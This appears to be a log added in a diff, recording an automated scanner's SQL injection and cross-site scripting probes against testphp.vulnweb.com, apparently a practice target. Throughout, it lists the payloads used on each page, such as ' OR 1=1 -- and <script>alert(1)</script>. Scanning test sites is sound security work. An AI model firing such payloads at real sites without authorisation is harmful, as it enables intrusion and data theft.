+[2025-06-11 23:20:11] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: admin' --
+[2025-06-11 23:20:11] XSS at http://testphp.vulnweb.com/categories.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:11] SQLi at http://testphp.vulnweb.com/categories.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:12] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:20:12] SQLi at http://testphp.vulnweb.com/categories.php using payload: " OR "1"="1
+[2025-06-11 23:20:12] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:12] SQLi at http://testphp.vulnweb.com/categories.php using payload: admin' --
+[2025-06-11 23:20:13] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:13] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: ' OR 1=1 --
+[2025-06-11 23:20:13] XSS at http://testphp.vulnweb.com/artists.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:14] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: " OR "1"="1
+[2025-06-11 23:20:14] XSS at http://testphp.vulnweb.com/artists.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:14] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: admin' --
+[2025-06-11 23:20:14] XSS at http://testphp.vulnweb.com/artists.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:15] SQLi at http://testphp.vulnweb.com/artists.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:15] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:20:15] SQLi at http://testphp.vulnweb.com/artists.php using payload: " OR "1"="1
+[2025-06-11 23:20:16] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:16] SQLi at http://testphp.vulnweb.com/artists.php using payload: admin' --
+[2025-06-11 23:20:16] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:17] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: ' OR 1=1 --
+[2025-06-11 23:20:17] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:17] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: " OR "1"="1
+[2025-06-11 23:20:18] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:18] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: admin' --
+[2025-06-11 23:20:18] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:19] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:19] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:20:19] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: " OR "1"="1
+[2025-06-11 23:20:20] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:20] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: admin' --
+[2025-06-11 23:20:20] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:21] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: ' OR 1=1 --
+[2025-06-11 23:20:21] XSS at http://testphp.vulnweb.com/cart.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:21] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: " OR "1"="1
+[2025-06-11 23:20:21] XSS at http://testphp.vulnweb.com/cart.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:22] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: admin' --
+[2025-06-11 23:20:22] XSS at http://testphp.vulnweb.com/cart.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:22] SQLi at http://testphp.vulnweb.com/cart.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:23] SQLi at http://testphp.vulnweb.com/cart.php using payload: " OR "1"="1
+[2025-06-11 23:20:23] SQLi at http://testphp.vulnweb.com/cart.php using payload: admin' --
+[2025-06-11 23:20:24] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:25] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:25] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:26] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:26] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:27] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:28] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:28] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:20:29] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:20:29] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:30] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:20:30] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:20:34] XSS at http://testphp.vulnweb.com/login.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:34] XSS at http://testphp.vulnweb.com/login.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:35] XSS at http://testphp.vulnweb.com/login.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:35] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:36] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:20:37] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:20:37] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:38] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:20:38] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:20:39] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:40] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:40] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:41] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:42] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:42] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:43] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:44] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:20:44] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:45] SQLi at http://testphp.vulnweb.com/signup.php using payload: " OR "1"="1
+[2025-06-11 23:20:45] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
